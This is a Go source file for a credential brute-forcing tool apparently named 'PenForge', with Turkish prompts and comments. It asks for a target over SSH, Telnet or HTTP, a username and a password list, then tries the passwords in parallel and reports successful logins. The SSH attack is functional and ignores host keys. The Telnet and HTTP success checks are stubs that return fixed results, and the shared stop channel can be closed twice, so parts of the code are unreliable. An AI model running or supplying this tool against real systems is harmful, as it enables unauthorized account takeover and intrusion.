package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
)

func main() {
	var protocol string

    fmt.Println(`
  _____           ______                   
 |  __ \         |  ____|                  
 | |__) |__ _ __ | |__ ___  _ __ __ _  ___ 
 |  ___/ _ \ '_ \|  __/ _ \| '__/ _ \ / _ \
 | |  |  __/ | | | | | (_) | | | (_| |  __/
 |_|   \___|_| |_|_|  \___/|_|  \__, |\___|
                                 __/ |     
                                |___/      
`)

	

	fmt.Print("Kullanmak istediğiniz protokol (SSH/Telnet/HTTP): ")
	fmt.Scanln(&protocol)
	protocol = strings.ToLower(protocol)

	if protocol == "ssh" || protocol == "telnet" || protocol == "http" {
		var hostname, targetURL, username, passwordListPath string

		if protocol == "ssh" || protocol == "telnet" {
			fmt.Print("Hedef sunucunun adresi: ")
			fmt.Scanln(&hostname)
		} else if protocol == "http" {
			fmt.Print("Hedef URL: ")
			fmt.Scanln(&targetURL)
		}

		fmt.Print("Kullanıcı adı: ")
		fmt.Scanln(&username)
		fmt.Print("Parola listesi dosya yolu: ")
		fmt.Scanln(&passwordListPath)

		if protocol == "ssh" {
			sshBruteforce(hostname, username, passwordListPath)
		} else if protocol == "telnet" {
			telnetBruteforce(hostname, username, passwordListPath)
		} else if protocol == "http" {
			httpBruteforce(targetURL, username, passwordListPath)
		}
	} else {
		fmt.Println("Geçersiz protokol. Lütfen SSH, Telnet veya HTTP olarak girin.")
	}
}

func sshBruteforce(hostname string, username string, passwordListPath string) {
	passwords, err := readPasswords(passwordListPath)
	if err != nil {
		fmt.Println("Parola listesi okunurken hata oluştu:", err)
		return
	}

	maxParallel := 10 
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, maxParallel) 
	found := make(chan struct{})
	for _, password := range passwords {
		wg.Add(1)
		semaphore <- struct{}{} 
		go func(password string) {
			defer func() {
				<-semaphore 
				wg.Done()
			}()
			if sshAttempt(hostname, username, password) {
				fmt.Printf("[SSH] [+] Başarılı giriş! Kullanıcı adı: \033[1;32m%s\033[0m, Parola: \033[1;32m%s\033[0m\n", username, password)
				close(found) // doğru şifreyi bulduğumuzda diğer goroutineleri durdur
			} else {
				fmt.Printf("[SSH] [-] Giriş başarısız. Kullanıcı adı: %s, Parola: %s\n", username, password)
			}
		}(password)
		select {
		case <-found:
			break // doğru şifreyi bulduğumuzda döngüyü kır
		default:
		}
	}
	wg.Wait()
}

func sshAttempt(hostname string, username string, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", hostname+":22", config)
	if err != nil {
		return false
	}
	defer client.Close()
	return true
}

func telnetBruteforce(hostname string, username string, passwordListPath string) {
	passwords, err := readPasswords(passwordListPath)
	if err != nil {
		fmt.Println("Parola listesi okunurken hata oluştu:", err)
		return
	}

	maxParallel := 10 
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, maxParallel) 
	found := make(chan struct{})
	for _, password := range passwords {
		wg.Add(1)
		semaphore <- struct{}{} 
		go func(password string) {
			defer func() {
				<-semaphore 
				wg.Done()
			}()
			if telnetAttempt(hostname, username, password) {
				fmt.Printf("[Telnet] [+] Başarılı giriş! Kullanıcı adı: %s, Parola: %s\n", username, password)
				close(found) // doğru şifreyi bulduğumuzda diğer goroutineleri durdur
			} else {
				fmt.Printf("[Telnet] [-] Giriş başarısız. Kullanıcı adı: %s, Parola: %s\n", username, password)
			}
		}(password)
		select {
		case <-found:
			break // doğru şifreyi bulduğumuzda döngüyü kır
		default:
		}
	}
	wg.Wait()
}

func telnetAttempt(hostname string, username string, password string) bool {
	conn, err := net.Dial("tcp", hostname+":23")
	if err != nil {
		return false
	}
	defer conn.Close()

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false
	}

	// Burada başarılı bir girişin kontrolü yapılabilir. Örneğin, gelen yanıtın incelenmesi gerekebilir.

	return true
}

func httpBruteforce(targetURL, username, passwordListPath string) {
	passwords, err := readPasswords(passwordListPath)
	if err != nil {
		fmt.Println("Parola listesi okunurken hata oluştu:", err)
		return
	}

	maxParallel := 10
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, maxParallel)
	found := make(chan struct{})
	for _, password := range passwords {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(password string) {
			defer func() {
				<-semaphore
				wg.Done()
			}()
			if httpAttempt(targetURL, username, password) {
				fmt.Printf("[HTTP] [+] Başarılı giriş! Kullanıcı adı: %s, Parola: %s\n", username, password)
				close(found) // doğru şifreyi bulduğumuzda diğer goroutineleri durdur
			} else {
				fmt.Printf("[HTTP] [-] Giriş başarısız. Kullanıcı adı: %s, Parola: %s\n", username, password)
			}
		}(password)
		select {
		case <-found:
			return // doğru şifreyi bulduğumuzda fonksiyonu sonlandır
		default:
		}
	}
	wg.Wait()
}


func httpAttempt(targetURL, username, password string) bool {
	client := &http.Client{}
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(fmt.Sprintf("username=%s&password=%s", username, password)))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Burada başarılı bir girişin kontrolü yapılabilir.
	// Örneğin, cevap kodu (resp.StatusCode) veya cevap içeriği incelenebilir.

	return false // Burada gelen yanıtın analizi yapılmalı ve başarılı giriş kontrol edilmeli.
}

func readPasswords(passwordListPath string) ([]string, error) {
    file, err := os.Open(passwordListPath)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var passwords []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        passwords = append(passwords, scanner.Text())
    }
    if err := scanner.Err(); err != nil {
        return nil, err
    }

    return passwords, nil
}
